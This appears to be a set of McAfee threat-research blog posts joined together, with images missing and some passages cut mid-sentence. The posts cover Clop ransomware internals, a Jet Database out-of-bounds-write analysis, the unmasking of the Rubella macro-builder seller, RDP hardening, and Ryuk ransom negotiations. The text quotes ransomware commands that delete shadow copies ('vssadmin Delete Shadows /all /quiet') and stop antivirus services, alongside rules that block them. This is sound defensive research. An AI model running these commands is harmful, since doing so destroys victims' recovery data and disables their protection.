This check is done with a custom function that checks character per character against all the list. It is the reason for having the same names in both upper and lower case, instead of using the function “lstrcmpiA,” for example, to avoid some hook in this function preventing the file from being affected. The check of the extension at the same time is to make the process of crypto quicker. Of course, the malware checks that the file does not have the name of the ransom note and the extension that it will put in the crypted file. Those blacklisted extensions will help the system avoid crashing during the encryption compared with other ransomware families.
:\/:
This behavior is normal in ransomware but the previous check against hardcoded hashes based on the file/folder name is weird because later, as we can see in the above picture, the next check is against plain text strings.
:\/:
If it passes this check, the malware will make a new thread with a struct prepared with a hardcoded key block, the name of the file, and the path where the file exists. In this thread the first action is to remove the error mode with “SetErrorMode” to 1 to avoid an error dialog being shown to the user if it crashes. Later, it will prepare the path to the file from the struct passed as argument to the thread and change the attributes of the file to ARCHIVE with the function “SetFileAttributesW”, however the malware does not check if it can make this action with success or not.
:\/:
Later it will generate a random AES key and crypt each byte of the file with this key, next it will put the mark “Clop^_” at the end of the file, after the mark it will put the key used to crypt the file ciphered with the master RSA key that has hardcoded the malware to protect it against third party free decryptors.
:\/:
The malware can use 2 different public RSA keys: one exported using the crypto api in a public blob or using the embedded in base64 in the malware. The malware will only use the second one if it cannot create the crypto context or has some problem with the crypto api functions.
:\/:
The malware does not have support for Windows XP in its use with the crypto functions, because the CSP used in Windows XP has another name, but if run in another operating system starting with Windows Vista, it can change the name in the debugger to acquire the context later and will generate a RSA public blob.
:\/:
Another difference with other ransomware families is that Clop will only cipher the disk that is a physical attached/embedded disk (type 3, FIXED or removable (type 2)). The malware ignores the REMOTE type (4)).
:\/:
After encrypting, the file will try to open in the same folder the ransom note and, if it exists, it will continue without overwriting it to save time, but if the ransom note does not exist it will access one resource in the malware called “OFFNESTOP”. This resource is crypted with the same XOR operation as the first resource: the .bat file, after decrypting, will write the ransom note in the folder of the file.
:\/:
After this, Clop will continue with the next file with the same process however, the check of the name based with the hash is avoided now.
:\/:
The second version found by the end of February has some changes if it is compared with the first one. The hash of this version is: “ed7db8c2256b2d5f36b3d9c349a6ed0b”.
:\/:
The first change is some changes in the strings in plain text of the code to make the execution in the “EraseTape” call and “FindAtomW” call more slowly. Now the names are for the tape: “” and the atom “”.
:\/:
The second change is the name of the resources crypted in the binary, the first resource that is a second batch file to delete the shadow volumes and remove the protections in the boot of the machine as the previous one has another name: “RC_HTML1”.
:\/:
However, the algorithm to decrypt this resource is the same, except that they changed the big string that acts as a key for the bytes. Now the string is: “JLKHFVIjewhyur3ikjfldskfkl23j3iuhdnfklqhrjjio2ljkeosfjh7823763647823hrfuweg56t7r6t73824y78Clop”. It is important to remember that this string remains in plain text in the binary but, as it has changed, it cannot be used for a Yara rule. The same counts for the name of the resources and also for the hash of the resource because the bat changes per line in some cases and in another as it will have more code to stop services of products of security and databases.
:\/:
The next change is the mutex name. In this version it is “HappyLife^_-“, so, can it be complex to make a vaccine based on the mutex name because it can be changed easily in each new sample.
:\/:
The next change is the hardcoded public key of the malware that is different to the previous version.
:\/:
Another change is the file created; the first version creates the file with the name “Favourite” but this version creates this file with the name “Comone”.
:\/:
Another difference is in the ransom note that is now clearer with some changes in the text and now has 3 emails instead of one to contact the ransomware developers.
:\/:
Clop is a ransomware family that its authors or affiliates can change in a quick way to make it more complex to track the samples. The code largely remains the same but changing the strings can make it more difficult to detect and/or classify it correctly.
:\/:
Sample 0403db9fcb37bd8ceec0afd6c3754314 has a compile date of 12 February, 2019 and has the following changes if compared with other samples:
:\/:
The resources crypted with the ransom note and the bat file are called “SIXSIX1” for the batch file and the another one for the ransom note “SIXSIX”.
:\/:
The batch file is different to the other versions, in this case not changing the boot config of the target victim.
:\/:
As a curiosity, this ransom note has a line that another does not have: “Every day of delay will cost you additional +0.5 BTC” (about 1500-1700 $).
:\/:
The ransom note does not have the previous string of increasing the price, but the maximum number of files that can be decrypted is 7 instead of 6..
:\/:
As the reader can understand, Clop changes very quickly in strings and name of resources to make it more complex to detect the malware.
:\/:
The function to check a file or a folder name using the custom hash algorithm can be a problem for the malware execution due if one of them is found in execution, the malware will avoid it. If this happens with a folder, all the files inside that folder will be skipped as well.
:\/:
As the algorithm and the hash is based on 32bits and only in upper case characters, it is very easy to create a collision as we know the target hashes and the algorithm
:\/:
It cannot be used as vaccine on itself, but it can be useful to protect against the malware if the most critical files are inside of a collision folder name.
:\/:
That not all ransomware is created equally, especially goes for Clop. Earlier in this blog we have highlighted some interesting choices the developers made when it came to detecting language settings, processes and the use of batch files to delete the shadow volume copies. We found in the analysis some unique functions compared with other ransomware families.
:\/:
However, Clop does embrace some of the procedures we have seen with other ransomware families by not listing the ransom amount or mentioning a bitcoin address.
:\/:
Victims must communicate via email instead of with a central command and control server hosting decryption keys. In the newer versions of Clop, victims are required to state their company name and site in the email communications. We are not absolutely sure why this is, but it might be an effort to improve victim tracking.
:\/:
Looking at the Clop ransom note, it shares TTPs with other ransomware families; e.g. it mimics the Ryuk ransomware and contains similarities with BitPaymer, however the code and functions are quite different between them.
:\/:
McAfee ENS customers can create expert rules to prevent batch command execution by the ransomware. A few examples are given below for reference.
:\/:
The following expert rule can be used to prevent the malware from deleting the shadow volumes with vssadmin (“vssadmin Delete Shadows /all /quiet”).
:\/:
When the expert rule is applied at the endpoint, deletion of shadow volume fails with the following error message:
:\/:
The malware also tries to stop McAfee services using command “net stop McShield /y”. The following expert rule can be used to prevent the malware from stopping McAfee Services:
:\/:
When the expert rule is applied at the endpoint, the attempt to stop McAfee service using net command fails with the following error message:
:\/:
Application processes discovery with some procedures as the hashes of the name, and directly for the name of the process.
:\/:
Clop ransomware shows some characteristics that enterprises are its intended targets instead of end consumers. The authors displayed some creative technical solutions, to detect the victim’s language settings and installed programs. On the other hand, we also noticed some weird decisions when it came to coding certain functionalities in the ransomware. Unfortunately, it is not the first time that criminals will make money with badly programmed malware.
:\/:
Clop is constantly evolving and even though we do not know what new changes will be implemented in the future, McAfee ATR will keep a close watch.
:\/:
 for a vulnerability in Microsoft’s Jet Database Engine. Microsoft released a patch in October 2018. We investigated this flaw at that time to protect our customers. We were able to find some issues with the patch and reported that to Microsoft, which resulted in another vulnerability, 
:\/:
The vulnerability exploits the Microsoft Jet Database Engine, a component used in many Microsoft applications, including Access. The flaw allows an attacker to execute code to escalate privileges or to download malware. We do not know if the vulnerability is used in any attacks; however, the proof of concept code is widely available.
:\/:
To exploit this vulnerability, an attacker needs to use social engineering techniques to convince a victim to open a JavaScript file which uses an ADODB connection object to access a malicious Jet Database file. Once the malicious Jet database file is accessed, it calls the vulnerable function in msrd3x40.dll which can lead to exploitation of this vulnerability.
:\/:
Although the available proof of concept causes a crash in wscript.exe, any application using this DLL is susceptible to the attack.
:\/:
,” which can be triggered via OLE DB, the API used to access data in many Microsoft applications. This type of vulnerability indicates that data can be written outside of the intended buffer, resulting in a crash. The cause of the crash is the maliciously crafted Jet database file. The file exploits an index field in the Jet database file format with an unexpectedly large number, resulting in an out-of-bounds write and, ultimately, the preceding crash.
:\/:
The proof of concept code contains one JavaScript file (poc.js), which calls a second file (group1). This is the Jet database file. By running poc.js through wscript.exe, we can trigger the crash.
:\/:
As we see in the preceding image, we can review debug information to determine the function that crashes is “msrd3x40!TblPage::CreateIndexes.” Furthermore, we can determine that the program is trying to write data and failing. Specifically, we can see that the program is using the “esi” register to write to the location [edx+ecx*4+574h], but that location is not accessible.
:\/:
We need to understand how this location is constructed to provide clues to the root cause. The debug information shows that register ecx contains the value 0x00002300. Edx is a pointer to memory that we will see again later. Finally, they are added together with an offset of 574 hexadecimal bytes to reference the memory location. From this information, we can guess the type of data that is stored there. It appears to be an array in which each variable is 4 bytes long and starts at the location edx+574h. While tracking the program, we determined the value 0x00002300 comes from the proof-of-concept file group1.
:\/:
We know that the program attempts to write out of bounds and we know where the attempt occurs. Now we need to determine why the program attempts to write at that location. We investigate the user-provided data of 0x00002300 to understand its purpose. To do this we must understand the Jet database file.
:\/:
Many researchers have extensively analyzed the Jet database file structure. Some of the details of previous work can be found at the following links:
:\/:
To summarize, a Jet database file is organized as a collection of pages, as shown in the following image:
:\/:
After the header come 126 bytes, RC4 encrypted, with the specific key 0x6b39dac7, which is the same for every JetDB file. Comparing the key value with the proof-of-concept file, we can identify that group1 is a Jet Version 3 file.
:\/:
Further examination leads to a Table Definition Pages section, which describes various data structures for a table. 
:\/:
The table definition data has various fields, including two of note: Index Count and Real Index Count.
:\/:
We can determine the value of these in our proof-of-concept file. When we check this with the group1 file, we see following:
:\/:
There are total of two indexes in the Index Count. When we parse both indexes we see the familiar value of 0x00002300:
:\/:
Our offending value 0x00230000 is the index number for index2 in the table. This index seems rather large and leads to the crash. Why does it crash the program? Further parsing the file, we find the names of the two indexes:
:\/:
With a debugger attached, we can see that first program calls the function “msrd3x40!operator new.” This allocates memory that stores the memory pointer address in eax:
:\/:
This index number is used later in the execution. The function msrd3x40!Index::Restore copies that index number to the index address + 24h. This process is repeated in a loop for all indexes. First it calls the “new” operator, which allocates the memory. It then creates an index on that address and moves the index number to the base address of the index +24h. We see this move in the following code, which shows the malicious index value copied to newly created index:
:\/:
Once successfully moved, the function msrd3x40!NamedObject::Rename is called and copies the index name value to the index address +40h:
:\/:
If we look at the esi register, we see it points to the address of the index. The ecx register has a value of [esi+24h], which is the index number:
:\/:
After a few more instructions, we can observe the original crash instructions. Edx points to the memory location. Ecx contains a very large number from the file group1. The program tries to access memory at location [edx+ecx*4+574h], which will cause the out-of-bounds write and the program crashes:
:\/:
What is happening with the data the program tries to write? If we watch the instructions, we see that program tries to write the value of esi to [edx+ecx*4+574]. If we print esi or the previous value, we see that it contains the index name ParentIdName, which we saw in group1:
:\/:
Ultimately, the program crashes while trying to process ParentIDName with a very large index number. The logic:
:\/:
From the start of memory location +574h, the program saves pointers to index names with each occupying 4 bytes multiplied by the index number mentioned in the file.
:\/:
If the index number is very large, as in this case, and no validation is done, then the program will try to write out of bounds and crash.
:\/:
This is a logic error and such errors are sometimes hard to catch. Many developers take extra precautions to avoid these types of bugs in their code. It is even more unfortunate when these bugs lead to serious security issues such as with CVE-2018-8423. When these issues are discovered and patched, we recommend applying the vendor patch as soon as possible to reduce your security risks.
:\/:
McAfee Network Security Platform customers are protected from this vulnerability by Signature IDs 0x45251700 – HTTP: Microsoft JET Database Engine Remote Code Execution Vulnerability (CVE-2018-8423) and 0x4525890 – HTTP: Microsoft JET Database Engine Remote Code Execution Vulnerability (CVE-2019-0576).
:\/:
McAfee HIPS, GBOP (Generic Buffer Overflow Protection) feature might cover this, depending on the process used to exploit the vulnerability.
:\/:
We thank Steve Povolny of McAfee’s Advanced Threat Research team, and Bing Sun and Imran Ebrahim of McAfee’s Hybrid Gateway Security team for their support and guidance with this analysis.

Everyday thousands of people receive emails with malicious attachments in their email inbox. Disguised as a missed payment or an invoice, a cybercriminal sender tries to entice a victim to open the document and enable the embedded macro. This macro then proceeds to pull in a whole array of nastiness and infect a victim’s machine. Given the high success rate, malicious Office documents remain a preferred weapon in a cyber criminal’s arsenal. To take advantage of this demand and generate revenue, some criminals decided to create off-the-shelf toolkits for building malicious Office documents. These toolkits are mostly offered for sale on underground cybercriminal forums.
:\/:
Announced today, the Dutch National High-Tech Crime Unit (NHTCU) arrested an individual suspected of building and selling such a criminal toolkit named the Rubella Macro Builder. McAfee Advanced Threat Research spotted the Rubella toolkit in the wild some time ago and was able to provide NHTCU with insights that proved crucial in its investigation. In the following blog we will explain some of the details we found that helped unmask the suspected actor behind the Rubella Macro Builder.
:\/:
An Office Macro Builder is a toolkit designed to weaponize an Office document so it can deliver a malicious payload by the use an obfuscated macro code that purposely tries to bypass endpoint security defenses. By using a toolkit dedicated to this purpose, an actor can push out higher quantities of malicious documents and successfully outsource the first stage evasion and delivery process to a specialized third party. Below is an overview with the general workings of an Office Macro Builder. The Defense evasion shown here is specific to Rubella Office Macro Builder. Additional techniques can be found in other builders.
:\/:
Rubella Macro Builder is such a toolkit and was offered by an actor by the same nickname “Rubella”. The toolkit was marketed with colorful banners on different underground forums. For the price of 500 US Dollars per month you could use his toolkit to weaponize Office documents that bypass end-point security systems and deliver a malicious payload or run a PowerShell Code of your choice.

In one of Rubella’s forum postings the actor was detailing the toolkit and that it managed to bypass the Windows Anti Malware Scan Interface (AMSI) present in Windows 10. To prove this success, the post contained a link to a screenshot. Being a Dutch researcher, this screenshot immediately stood out because of the Dutch version of Microsoft Word that was used. Dutch is a very uncommon language, only a small percentage of the world’s population speaks it, let alone an even smaller percentage of cybercriminals who use it.
:\/:
 last year on the individuals behind Coinvault ransomware. One of the reasons they got caught was the use of flawless Dutch in their code. With this in the back of our minds we decided to go deeper down the rabbit hole.
:\/:
 was actually promoting a variety of different, some self-written, products and services, ranging from (stolen) credit card data, a crypto wallet stealer and a malicious loader software to a newly pitched product called Tantalus ransomware-as-a-service.
:\/:
During our research we were able to link different nicknames used by the actor on several forums across a timespan of many years. Piecing it all together, Rubella showed a classic growth pattern of an aspiring cybercriminal, started by gaining technical security knowledge on beginner forums with low op-sec and gradually moved to some of the bigger, exclusive forums to offer products and services.
:\/:
One of the posts Rubella placed on a popular hacker forum was promoting a piece of free software the actor coded to spoof email. The posting contained a link to VirusTotal and included a SHA-256 hash of the software. This gained our interest since it provided a possibility to link the adversary to the capability.
:\/:
Closer examination of the piece of software on VirusTotal showed that the mail Spoofer contained a debug or PDB path “C:\Users\Breitling”. Even though the username Breitling isn’t very revealing about an actual person, leaving such a specific PDB path within malware is a classic mistake.
:\/:
By pivoting on the specific PDB path we found additional samples on VirusTotal, including a file that was named RubellaBuilder.exe, which was a version of the Macro builder that Rubella was offering. Later in the blog post we will take a closer look at the builder itself.
:\/:
Since Breitling was most likely the username used on the development machine, we were wondering if we could find Office documents that were crafted on the same machine and thus also containing the author name Breitling. We found an Office document with Breitling as author and the document happened to be created with a Dutch version of Microsoft Word.
:\/:
Closer inspection of the content of the Word document revealed that it also contained a string with the familiar Jabber account of 
:\/:
Circling back to the forums we found an older posting under one of the nicknames we could link to Rubella. In this posting the actor is asking for advice on how to add a registry key using C#. They placed another screenshot to show the community what they were doing. This behavior clearly shows a lack of skill but at the same time his thirst for knowledge.
:\/:
 was quite extroverted on the underground forums and had stated Jabber contact details in advertisements we decided to carefully initiate contact with him in the hope that we would get access to some more information. About a week after we added 
:\/:
 to our Jabber contact list, we received a careful “Hi.” We started talking and posing as a potential buyer, carefully mentioning our interest the Rubella Macro Builder. During this chat 
:\/:
 was quite responsive and as a real businessperson, mentioned that he was offering a new “more exclusive” Macro Builder named Dryad. 
:\/:
Eventually we ended our conversation in a friendly manner and told Rubella we would be in touch if we remained interested.
:\/:
Based on the information provided from the chat with Rubella we performed a quick search for Dryad Macro Builder. We eventually found a sample of the Dryad Macro Builder and decided to further analyze this sample and compare it for overlap with the Rubella Macro Builder.
:\/:
We noticed that the program was coded in .NET Assembly which is usually a preferred language for less skilled malware coders.
:\/:
We also noticed a number-generated HWID (Hardware-ID) that was always the same when running the app. The HWID number is a unique identifier specific to the machine it was running on and was used to register the app.
:\/:
When trying to enter a random name we detected a remote connection to the website ‘hxxps://tailoredtaboo.com/auth/check.php’ to verify the license.
:\/:
The request is made with the following parameters ‘hwid=<HWID>&username=<username>&password=<password>’.
:\/:
In this interface it is possible to see the function proposed by the app and it was similar to the screenshot that was shared during our chat.
:\/:
The sample is coded in .Net without any obfuscation. We can see in the following screenshot the structure of the file.
:\/:
The main function launches the interface with the pre-configuration options. We can see here the link to putty.exe (also visible in the screenshots) for the payload that needs to be changed by the user.
:\/:
To validate the license the program will perform some check and combine a Hardware ID, a username and a password.
:\/:
 Globally unique identifier for the processor. This identifier may only be unique within a processor family.
:\/:
 This value comes from the Processor Version member of the Processor Information structure in the SMBIOS information.
:\/:
 Release date of the Windows BIOS in the Coordinated Universal Time (UTC) format of YYYYMMDDHHMMSS.MMMMMM(+-)OOO.
:\/:
With all that hardware information collected it will generate a hash that will be the unique identifier.
:\/:
This hash, the username and password will be sent to the server to verify if the license is valid. In the source code we noticed the tailoredtaboo.com domain again.
:\/:
To generate a macro the builder is using several parts. The format function shows how each file structure is generated.
:\/:
The function GenRandom is used to generate random strings, chars as well as numbers. It is used to obfuscate the macro generated.
:\/:
We did also notice that the builder uses additional functions that were still under development, as we can see with the “Script Generator” tab.
:\/:
Additionally, we can see the “Decoy Option” tab which is just a template to create another tab. The tab does not show anything. It seems the author left this tab to create another one.
:\/:
Dryad is very similar to the Rubella Builder; many hints present in the code confirm the conversation we had with Rubella. Unlike Rubella, Dryad did have a scrubbed PDB path.
:\/:
The license check is also the same function, using the domain tailoredtaboo.com, Below is the license check function from the Rubella builder:
:\/:
A quick search into the domain Tailoredtaboo showed that it had several subdomains, including a control panel on a subdomain named cpanel.tailoredtaboo.com.
:\/:
The domain tailoredtaboo.com has been linked to malicious content in the past. On Twitter the researcher 
:\/:
 reported in April 2018 that he found some malicious files hosted on the specific domain. In the directory listing of the main domain there were several files also mentioning the name Rubella.
:\/:
Based on all the references, and the way the domain Tailoredtaboo.com was used, we believe that the domain plays a central administrative role for both Rubella and Dryad Macro Builder and can provide insight into the customers of both Macro Builders
:\/:
Toolkits that build weaponized Office documents, like Dryad and Rubella, cater to the increasing cybercriminal demand of this type of infection vector. With the arrest of the suspect comes an end to the era of Dryad and Rubella Macro Builder. Based on his activity, the suspect looked like quite the cybercriminal entrepreneur, but given his young age this is also a worrisome thought. If only he would have used his skills for good. The lure of quick cash was apparently more enticing than building a solid long-term career. We at McAfee never like to see young talented individuals heading down a dark path.
:\/:
 The blog highlights a particular vulnerability in RDP which was deemed critical by Microsoft due to the fact that it exploitable over a network connection without authentication. These attributes make it particularly ‘wormable’ – it can easily be coded to spread itself by reaching out to other accessible networked hosts, similar to the famous EternalBlue exploit of 2017. This seems particularly relevant when (at the time of writing) 3,865,098 instances of port 3389 are showing as open on Shodan.
:\/:
 and described the sheer ease with which cybercriminals can obtain access to a large variety of computer systems, some of which are very sensitive. One of the methods of RDP misuse that we discussed was how it could aid deploying a targeted ransomware campaign. At that time one of the most prolific targeted ransomware groups was SamSam. To gain an initial foothold on its victims’ networks, SamSam would often rely on weakly protected RDP access. From its RDP launchpad, it would proceed to move laterally through a victim’s network, successfully exploiting and discovering additional weaknesses, for instance in a company’s Active Directory (AD).
:\/:
 indicted two Iranian men for developing and spreading the SamSam ransomware extorting hospitals, municipalities and public institutions, causing over $30 million in losses. Unfortunately, this did not stop other cybercriminals from using similar tactics, techniques and procedures (TTPs).
:\/:
The sheer number of vulnerable systems in the wild make it a “target” rich environment for cybercriminals.
:\/:
 to the Ryuk ransomware family that has been using RDP as an initial entry vector. Even though RDP misuse has been around for many years, it does seem to have gained an increased popularity amongst criminals focused on targeted ransomware.
:\/:
Given the dire circumstances highlighted above it is wise to question if externally accessible RDP is an absolute necessity for any organization. It is also wise to consider how to better secure RDP if you are absolutely reliant on it. The good news is there are several easy steps that help an organization to better secure RDP access.
:\/:
That is why, in this blog, we will use the adversarial knowledge from the McAfee ATR red team to explain what easy measures can be undertaken to harden RDP access.
:\/:
Recommendations are additional to standard systems hygiene which should be carried out for all systems (although it becomes more important for Internet connected hosts), such as keeping all software up-to-date, and we intentionally avoid ‘security through obscurity’ items such as changing the RDP port number.
:\/:
To be very clear… RDP should never be open to the Internet. The internet is continuously being scanned for open port 3389 (the default RDP port). Even with a complex password policy and multi-factor authentication you can be vulnerable to denial of service and user account lockout. A much safer alternative is to use a Virtual Private Network (VPN). A VPN will allow a remote user to securely access their corporate network without exposing their computer to the entire Internet. The connection is mutually encrypted, providing authentication for both client and server, preferably using a dual factor, while creating a secure tunnel to the corporate network. As you only have access to the network you will still need to RDP to the computer but can do so more securely without exposing it to the internet.
:\/:
 alternative acronym for RDP is “Really Dumb Passwords.” That short phrase encapsulates the number one vulnerability of RDP systems, simply by scanning the internet for systems that accept RDP connections and launching a brute-force attack with popular tools such as, ForcerX, NLBrute, Hydra or RDP Forcer to gain access.
:\/:
Below are the top 15 passwords used on vulnerable RDP systems. We built this list based on information on weak passwords shared by a friendly Law Enforcement Agency from taken down RDP shops. What is most shocking is the fact that there is such a large number of vulnerable RDP systems did not even have a password.
:\/:
In addition to a complex password, it is best practice use multi-factor authentication. Even with great care and diligence, a username and password can still be compromised. If legitimate credentials have been compromised, multi-factor authentication adds an additional layer of protection by requiring the user to provide a security token, e.g. a code received by notification or a biometric verification. Better yet, a FIDO based authentication device can provide an extra factor which is not vulnerable to spoofing attacks, in a similar fashion to other one-time-password (OTP) mechanisms. This increases the difficulty for an unauthorized person to gain access to the computing device.
:\/:
Recent versions of Windows Server provide an RDP gateway server. This provides one external interface to many internal RDP endpoints, thus simplifying management, including many of the items outlined in the following recommendations. These comprise of logging, TLS certificates, authentication to the end device without actually exposing it to the Internet, authorization to internal host and user restrictions, etc.
:\/:
Microsoft provides detailed instructions for configuration of remote desktop gateway server, for Windows Server 2008 R2 as an example, over 
:\/:
A high number of failed logon attempts is a strong indication of a brute force attack. Limiting the number of logon attempts per user can prevent such attacks. A failed logon attempt is logged under Windows Event ID 4625. An RDP logon falls under logon type 10, RemoteInteractive. The account lockout threshold can be specified in the local group policy under security settings: Account Policies.
:\/:
For logging purposes, it is best to log both failed and successful logons. Additionally, it is important to note that “specific security layer for RDP connections” needs to be enabled. Otherwise, you will be unable to tell that the logon attempt came over RDP or see the source IP address. A comparison is shown below.
:\/:
Firewall rules can be created to restrict Remote Desktop access so that only a specific IP address or a range of IP addresses can access a given device. This can be achieved by simply opening “Windows Firewall with Advanced Security,” clicking on Inbound Rules and scrolling down to the RDP rule. A screen shot can be seen below.
:\/:
When connecting to a remote machine via RDP, credentials are stored on that machine and may be retrievable by other users of the systems (e.g. malicious attackers). Microsoft has added restricted admin mode which instructs the RDP server not to store credentials of users who log in. Behind the scenes, the server now uses ‘network’ login rather than ‘interactive’ and therefore uses hashes or Kerberos tickets rather than passwords for authentication. Assessment of the pros and cons of this option are recommended before enabling in your environment. On the negative side, the use of network login exposes the possibility of credential reuse (pass the hash) attacks against the RDP server. Pass the hash is likely possible anyway, internally, via other exposed ports so may not significantly increase exposure there, but when including this option to Internet servers, where other ports are likely (and should be!) restricted, pass the hash is then extended to the Internet. Given the pros and cons, avoiding internal escalation of privilege is often prioritized and therefore restricted admin mode is enabled.
:\/:
t. This is configured on the Remote Desktop server. This can be further improved upon by using Enhanced RDP Security. When Enhanced RDP security is used, encryption and server authentication are implemented by external security protocols, e.g. TLS or CredSSP. One of the key benefits of Enhanced RDP Security is that it enables the use of Network Level Authentication (NLA) when using CredSSP as the external security protocol.
:\/:
. Certificates can be pushed using Group Policy Objects (GPO) where this is available. Incompatible operating system environments must import certificates via the web interface exposed at https://<server>/Certsrv.
:\/:
To reduce the amount of initially required server resources, and thereby mitigate against denial of service attacks, network level authentication (NLA) can be used. Within this mode, strong authentication takes place before the remote desktop connection is established, using the Credential Security Support Provider (CredSSP) either through TLS or Kerberos. NLA can also help to protect against man-in-the-middle attacks, where credentials are intercepted. However, be aware that NLA over NTLM does not provide strong authentication and 
:\/:
Interestingly, BlueKeep, mentioned above, is partially mitigated by having NLA enabled. As reported by Microsoft in the associated advisory “With NLA turned on, an attacker would first need to authenticate to Remote Desktop Services using a valid account on the target system before the attacker could exploit the vulnerability.”
:\/:
All administrators can use RDP by default. Remote access should be limited to only the accounts that require it. If all administrators do not need remote access you should consider removing the Administrator account from the RDP access group. You can then add the specific users which require access to the “Remote Desktop Users” group. See 
:\/:
Local administrator accounts provide an attack vector for attackers who gain access to a system. Credentials can be cracked offline and more accounts means more likelihood of a successful crack. Therefore, you should aim for a maximum of one local administrator account which is secured appropriately.
:\/:
If the local administrator accounts match those assigned to their counterparts on other systems within the server’s internal network, the attacker can potentially re-use credentials to move laterally. This issue occurs quite frequently, so Microsoft provided Local Administrator Password Solution (LAPS) as a means to avoid this scenario across the organization with central management of unique local administrator credentials. This is particularly relevant for externally exposed systems.
:\/:
Accounts within the domain admins group have full control of the domain by default, by virtue of being part of the administrators group for all domain controllers, domain workstations and domain member servers. If a credential for a domain admin account is retrieved from the RDP server, the attacker now holds the ‘keys to the kingdom’ and is in full control of the entire domain. You should reduce the amount of domain administrators within the organization in general and avoid accessing the RDP server or other externally exposed systems via these accounts, to avoid inadvertently making credentials accessible.
:\/:
In general, ‘least privilege’ administration models should be used. Microsoft provides guidance in this area, including how best to use domain admin accounts, 
:\/:
Where possible, RDP servers should be placed within a DMZ or other restricted area of the network. The idea here is that if an attack is successful, its scope is reduced and confined to the RDP server alone. Often RDP is exposed specifically to allow external users onto the network, so this may not be a feasible solution, however it should be considered and the quantity of services reachable within the internal network should be minimized.
:\/:
There are many options for account naming conventions, ranging from firstname.lastname to not deriving usernames from name data; all having their pros and cons. However, some of the more commonly used account naming conventions such as firstname.lastname, make it very easy to guess usernames and email addresses. This can be a security concern as spammers and hackers will readily use this information.
:\/:
When trying to run an efficient IT organization, having remote access to certain computer systems might be essential. Unfortunately, when not implemented correctly, the tools that make remote access possible also open your systems up to unwanted guests. In the last few years there have been far too many examples of where vulnerable RDP access gave way to a full-scale network compromise.
:\/:
In this article we have shown that RDP access can be hardened with some easy steps. Please take the time to review your RDP security posture.
:\/:
 an article describing how the hasty attribution of Ryuk ransomware to North Korea was missing the point. Since then, collective industry peers discovered additional technical details on 
:\/:
 of how the ransomware is piggybacking the infamous and ever evolving Trickbot as a primary attack vector. In this blog post we have teamed up with 
:\/:
 to take a closer look at the adversary and victim dynamics of Ryuk Ransomware. We structured our research using the Diamond threat model and challenged our existing hypotheses with fresh insights.
:\/:
Within Cyber Threat intelligence research, a popular approach is to model the characteristics of an attack using 
:\/:
. This model relates four basic elements of an intrusion: adversary, capabilities, infrastructure and victim.
:\/:
The Diamond Model offers a holistic view of an intrusion that is a helpful guideline to shape the direction of intelligence research. By searching for relationships between two elements one can gather new evidence. For instance, by analyzing and reverse engineering a piece of malware one might uncover that a certain server is being used for command and control infrastructure, thus linking capability with infrastructure (as shown below).
:\/:
Alternatively, one might search underground forums to find information on adversaries who sell certain pieces of malware, thus linking an adversary with a capability. For instance, finding the underground forum advertisement of Hermes2.1.
:\/:
 we explained The Analysis of Competing Hypotheses (ACH), the process of challenging formed hypotheses with research findings.
:\/:

By following this method, we concluded that the strongest hypothesis is not the one with the most verifying evidence, but the one with the least falsifying evidence.
:\/:
In order to construct a hypothesis with the least falsifying evidence we welcome research published by our industry peers to dissimilate insights that challenge our hypotheses. When we combined all the evidence with links on the diamond model, we discovered that one essential link wasn’t made, the link between adversary and victim.
:\/:
Despite published research, the direct link between adversary and victim remained relatively unexplored. Unlike most cybercrime, ransomware and digital extortion frequently creates a strong social connection between adversary and victim. The adversary has certain needs and views the victim as the means to fulfill those needs. The connection between an adversary and victim often generates valuable insights, especially in cases where (extensive) negotiation take place.
:\/:
Luckily, one of our NoMoreRansom partners, Coveware, is specialized in ransomware negotiations and has gained valuable insights help us link adversary and victim.
:\/:
By aggregating ransomware negotiation and payment data, Coveware is able to identify strain-specific ransomware trends. With regards to Ryuk, it should be noted that ransom amounts average more than 10x the average, making it the costliest type of ransomware. Coveware also observed that some Ryuk ransoms were highly negotiable, while others were not. The bar-belled negotiation results generated an average ransom payment of $71k, a 60% discount from an average opening ask of $145k.
:\/:
The bar-belled negotiation outcomes meant that some victims were stonewalled. These victims either lost their data or took on staggering financial risk to pay the ransom. The outcomes also imply that in certain cases the adversary would rather receive infrequent large windfalls (often in excess of 100BTC), while in other cases the adversary was keen to monetize every attack and accept lower amounts to ensure payment. This difference in modus operandi suggests that 
:\/:
 have been observed before. While it is not uncommon for ransom notes to share similar language, sequences of phrases tend to remain within the same ransomware family. Slight copy+paste modifications are made to the ransom text as a variant is passed along to different groups, but large alterations are rarely made. Below is a comparison of a Bitpaymer initial email (left) and a standard Ryuk initial email (right).
:\/:
The shared language implies that text once unique to a Bitpaymer campaign was borrowed for a Ryuk campaign, possibly by an operator running simultaneous ransom campaigns of both Bitpaymer and Ryuk or the imitation can be considered as the sincerest form of flattery.
:\/:
A more dramatic scripted communication difference has been observed in the initial email response from Ryuk adversaries. The initial email response is typically identical within ransomware families belonging to the same campaign. When significant differences in length, language, and initial ransom amount appear in the initial email response we are comfortable assuming they belong to unique groups with unique modus operandi. This would mean that Ryuk in being spread by more than one actor group.
:\/:
A final indicator that multiple groups are running simultaneous Ryuk campaigns can be observed in the activity of bitcoin after it hits a ransom address. Surprisingly, despite the differences between negotiation outcome and initial communications, Coveware observed little difference between the BTC wallets (blacked out to protect victims) associated with the above cases. Initial comparison showed no meaningful discrepancy in difference between the time of a ransom payment and the time of a corresponding withdraw. Additionally, the distribution of funds upon withdrawal was consistently split between two addresses. Coveware will continue to monitor the funds associated with campaigns for meaningful indicators.
:\/:
With few exceptions, the rest of the email replies during a Ryuk extortion negotiation are extremely short and blunt. Typical replies and retorts are generally less than 10 written words and often just a single number if the ransom amount is the point of discussion. This correspondence is unique to Ryuk.
:\/:
 to contextualize the methods and reasons for the cyber criminals’ attacks on western companies. The French expression originates from the seventeenth century and literally translates to “in war as in war” and loosely translates to: “In Harsh times one has to do with what’s available”. The striking thing about this expression is that is prominently featured in volume 30 of the 
:\/:
. Lenin uses the expression to describe the struggle of his people during the war against western capitalism.
:\/:
This concept of “The capitalistic West versus the Poor east” is actually something McAfee ATR sees quite often expressed by cyber criminals from some of the Post-Soviet republics. This expression may be a clear indicator of the origin and cultural view of the criminals behind Ryuk.
:\/:
Even though the average ransom discounts of Ryuk are large (~60%), the absolute level of the ransom is extreme. Accordingly, we have seen evidence that links ransom demands to the size of the network footprint of the victim company. However, this doesn’t mean that the ransom demand correlates to the victims actual operational and financial size.
:\/:
